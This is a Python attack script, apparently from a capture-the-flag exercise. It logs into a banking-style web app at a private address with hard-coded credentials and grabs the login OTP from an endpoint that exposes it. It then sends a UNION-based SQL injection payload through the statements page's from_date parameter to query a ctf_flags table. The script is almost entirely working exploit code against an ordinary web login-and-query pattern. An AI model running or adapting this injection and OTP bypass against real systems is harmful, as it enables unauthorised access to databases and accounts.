#!/usr/bin/env python3
"""
Test if ctf_flags table has data and if SQLi can access it
"""
import urllib.request
import urllib.parse
import http.cookiejar
import json
import re
import sys

if sys.stdout.encoding != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

url_base = "http://10.141.199.78:9443"
cookie_jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))

try:
    # Login
    req = urllib.request.Request(f"{url_base}/login")
    opener.open(req, timeout=10)

    login_data = urllib.parse.urlencode({
        'customer_id': 'BS100234',
        'password': 'password123'
    }).encode()
    req = urllib.request.Request(f"{url_base}/login", data=login_data, method='POST')
    opener.open(req, timeout=10)

    req = urllib.request.Request(f"{url_base}/get-login-otp")
    otp = json.loads(opener.open(req, timeout=10).read().decode('utf-8')).get('otp')

    otp_data = urllib.parse.urlencode({'otp': otp}).encode()
    req = urllib.request.Request(f"{url_base}/login", data=otp_data, method='POST')
    opener.open(req, timeout=10)

    # Access statements to seed
    req = urllib.request.Request(f"{url_base}/statements")
    opener.open(req, timeout=10)

    print("[*] Testing SQLi with COUNT query...")

    # Try to count ctf_flags rows
    payload = "2099-01-01' UNION SELECT 1,(SELECT CAST(COUNT(*) AS CHAR)),3,4,5,6,7 FROM ctf_flags#"
    encoded = urllib.parse.quote(payload)
    url = f"{url_base}/statements?from_date={encoded}&account_id=1"

    req = urllib.request.Request(url)
    response = opener.open(req, timeout=10)
    html = response.read().decode('utf-8', errors='ignore')

    # Look for number in table cells
    cells = re.findall(r'<td[^>]*>([^<]+)</td>', html)
    print(f"[+] Found {len(cells)} table cells")
    for cell in cells:
        print(f"    {cell}")

    if any('0' in cell or '1' in cell or '2' in cell for cell in cells):
        print("[+] Count query may have worked")

except Exception as e:
    print(f"Error: {e}")
    import traceback
    traceback.print_exc()
